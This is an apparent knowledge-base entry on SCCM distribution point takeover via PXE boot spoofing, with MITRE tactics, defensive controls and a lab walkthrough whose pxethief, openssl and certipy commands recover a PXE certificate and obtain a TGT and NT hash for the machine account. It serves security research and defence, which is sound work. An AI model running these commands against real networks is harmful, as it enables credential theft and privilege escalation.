# ELEVATE-4

## Description
Distribution Point Takeover via PXE Boot Spoofing

## MITRE ATT&CK Tactics
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation

## Requirements
- Local network access
- Line of sight to PXE-enabled distribution point

## Optional Requirement
- Line of sight to a DHCP server (required if a distribution point hasn't been previously discovered)

## Summary
SCCM sites may optionally be configured to support public-key infrastructure (PKI) certificates for secure communications. For deployments with internet-based site systems, PKI certificates are required. When deployed, the distribution point (DP) role requires it's PKI certificate to support client authentication and for the private key to be exportable. The certificate is used by the DP to support communication with HTTPS enabled management points. For PXE-enabled distribution points, the certificate is sent to and used by client computers to authenticate to management points during operating system deployment. For environments that leverage Microsoft's PKI solution Active Directory Certificate Services (AD CS), the certificate generated for the DP role may be used to authenticate as the DP's host AD machine account. An attacker who is able to successfully spoof PXE boot deployment and extract the PKI certificate from the PXE boot variables file contents may gain control of the certificate's AD identity.

## Impact
 The impact of recovery is environment dependent. At a minimuim, based on Microsoft's [documentation](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/network/pki-certificate-requirements#site-systems-that-have-a-distribution-point-installed) an attacker that recovers this certificate can impersonate a DP's AD identity and compromise the host system. 

## Defensive IDs
- [DETECT-7: Monitor read access to the SMSTemp directory](../../../defense-techniques/DETECT/DETECT-7/detect-7_description.md)
- [PREVENT-6: Configure a strong PXE boot password](../../../defense-techniques/PREVENT/PREVENT-6/prevent-6_description.md)
- [PREVENT-21: Restrict PXE boot to authorized VLANs](../../../defense-techniques/PREVENT/PREVENT-21/prevent-21_description.md)

## Examples

1. On the attacker server, spoof the PXE boot process with pxethief.py with option 2 to recover the PKI certificate distributed by the targeted DP. A suitable Distribution Point can be identified using [RECON-2](../../RECON/RECON-2/recon-2_description.md). Otherwise, a PXE boot server may be discovered via a PXE DHCP discover broadcast using pxethief's option 1. 

```

┌──(PXEThief)─(root㉿sccm-kali)-[/home/kali/PXEThief]
└─# python3 pxethief.py 2 10.3.10.12

 ________  ___    ___ _______  _________  ___  ___  ___  _______   ________
|\   __  \|\  \  /  /|\  ___ \|\___   ___\\  \|\  \|\  \|\  ___ \ |\  _____\
\ \  \|\  \ \  \/  / | \   __/\|___ \  \_\ \  \\\  \ \  \ \   __/|\ \  \__/
 \ \   ____\ \    / / \ \  \_|/__  \ \  \ \ \   __  \ \  \ \  \_|/_\ \   __\
  \ \  \___|/     \/   \ \  \_|\ \  \ \  \ \ \  \ \  \ \  \ \  \_|\ \ \  \_|
   \ \__\  /  /\   \    \ \_______\  \ \__\ \ \__\ \__\ \__\ \_______\ \__\
    \|__| /__/ /\ __\    \|_______|   \|__|  \|__|\|__|\|__|\|_______|\|__|
          |__|/ \|__|

[+] Generating and downloading encrypted media variables file from MECM server located at 10.3.10.12
[+] Using interface: eth0 - eth0
[+] Targeting user-specified host: 10.3.10.12
[+] Asking ConfigMgr for location to download the media variables and BCD files...
Finished sending 1 packets
Received 1 packets, got 1 answers, remaining 0 packets

[!] Variables File Location: \SMSTemp\2025.06.04.15.34.55.0001.{3221FD8C-81AB-441A-B57F-E3A3D10B2AD4}.boot.var
[!] BCD File Location: \SMSTemp\2025.06.04.15.34.54.04.{3221FD8C-81AB-441A-B57F-E3A3D10B2AD4}.boot.bcd
[!] Blank password on PXE boot found!
[!] Attempting automatic exploitation.
[+] Media variables file to decrypt: 2025.06.04.15.34.55.0001.{3221FD8C-81AB-441A-B57F-E3A3D10B2AD4}.boot.var
[+] Password bytes provided: 0xeaffc0ff3300b8ffbaff6d004a00daffbfffb6ff
[+] Successfully decrypted media variables file with the provided password!
[!] Writing media variables to variables.xml
[!] Writing _SMSTSMediaPFX to 123_affba0f7-65c6-4743-99b0-99af62d_SMSTSMediaPFX.pfx. Certificate password is affba0f7-65c6-4743-99b0-99af62d

```
2. Inspect the certificate with openssl to confirm it's an AD CS certificate and contains the client authentication EKU

```
┌──(PXEThief)─(root㉿sccm-kali)-[/home/kali/PXEThief]
└─$ openssl pkcs12 \
-in 123_affba0f7-65c6-4743-99b0-99af62d_SMSTSMediaPFX.pfx \
-passin pass:affba0f7-65c6-4743-99b0-99af62d \
-nokeys -clcerts | openssl x509 -text -certopt no_pubkey,no_sigdump -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            34:00:00:00:03:cd:a2:70:1a:ec:40:dc:17:00:00:00:00:00:03
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: DC=domain, DC=ludus, CN=ludus-CA
        Validity
            Not Before: Jun  4 19:21:29 2025 GMT
            Not After : Jun  4 19:21:29 2026 GMT
        Subject:
        X509v3 extensions:
            Microsoft certificate template:
                0-.%+.....7.........z..$...#...cb..........d...
            X509v3 Extended Key Usage:
                TLS Web Client Authentication
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            Microsoft Application Policies Extension:
                0.0
..+.......
            X509v3 Subject Key Identifier:
                16:40:8E:22:CF:A9:E8:21:FC:9B:2D:7C:73:90:F5:90:60:8A:89:73
            X509v3 Authority Key Identifier:
                7A:D3:15:84:7A:FD:48:F2:C0:33:D1:BE:5E:62:57:AD:2F:53:EA:C8
            X509v3 CRL Distribution Points:
                Full Name:
                  URI:ldap:///CN=ludus-CA,CN=DC01,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=ludus,DC=domain?certificateRevocationList?base?objectClass=cRLDistributionPoint

            Authority Information Access:
                CA Issuers - URI:ldap:///CN=ludus-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=ludus,DC=domain?cACertificate?base?objectClass=certificationAuthority
            X509v3 Subject Alternative Name: critical
                DNS:sccm-sitesrv.ludus.domain
```

3. Use certipy to authenticate on behalf of the recovered certificate's identity.


```
┌──(Certipy)─(root㉿sccm-kali)-[/home/kali/Certipy]
└─# certipy auth -pfx ../PXEThief/123_affba0f7-65c6-4743-99b0-99af62d_SMSTSMediaPFX.pfx -password affba0f7-65c6-4743-99b0-99af62d -dc-ip 10.3.10.10
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'sccm-sitesrv.ludus.domain'
[*] Using principal: 'sccm-sitesrv$@ludus.domain'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'sccm-sitesrv.ccache'
[*] Wrote credential cache to 'sccm-sitesrv.ccache'
[*] Trying to retrieve NT hash for 'sccm-sitesrv$'
[*] Got hash for 'sccm-sitesrv$@ludus.domain': aad3b435b51404eeaad3b435b51404ee:56c99bd025fb48dea2ea4cdeee878af1
```

## References
- Christopher Panayi, [pxethief](https://github.com/MWR-CyberSec/PXEThief)
- Christopher Panayi, [Identifying and retrieving credentials from SCCM/MECM Task Sequences](https://www.mwrcybersec.com/research_items/identifying-and-retrieving-credentials-from-sccm-mecm-task-sequences)
- CRED-1, [Retrieve secrets from PXE boot media](../../CRED/CRED-1/cred-1_description.md)
- Microsoft, [PKI certificate requirements for Configuration Manager](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/network/pki-certificate-requirements#site-systems-that-have-a-distribution-point-installed)
- onSec-fr, [Got pfx from server with client auth](https://github.com/MWR-CyberSec/PXEThief/issues/8)
